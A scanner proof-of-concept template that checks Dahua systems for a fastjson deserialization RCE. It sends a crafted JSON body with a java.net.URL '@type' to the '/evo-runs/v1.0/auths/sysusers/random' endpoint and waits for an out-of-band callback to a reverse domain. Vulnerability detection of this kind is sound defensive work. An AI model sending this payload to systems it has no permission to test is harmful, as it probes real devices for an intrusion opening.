name: poc-yaml-dahua-random-fastjson-rce
transport: http

set:
  reverse: newReverse()
  reverseDomain: reverse.domain


  
rules:
  r0:
    request:
      method: POST
      path: /evo-runs/v1.0/auths/sysusers/random
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/json;charset=utf-8
        Accept-Encoding: gzip
        Connection: close

      body: '
         {
           "a":{
               "@type":"com.alibaba.fastjson.JSONObject",
               {"@type":"java.net.URL","val":"http://{{reverseDomain}}"}
               }""
         }'
    expression: reverse.wait(1)
expression: r0()

detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/139305618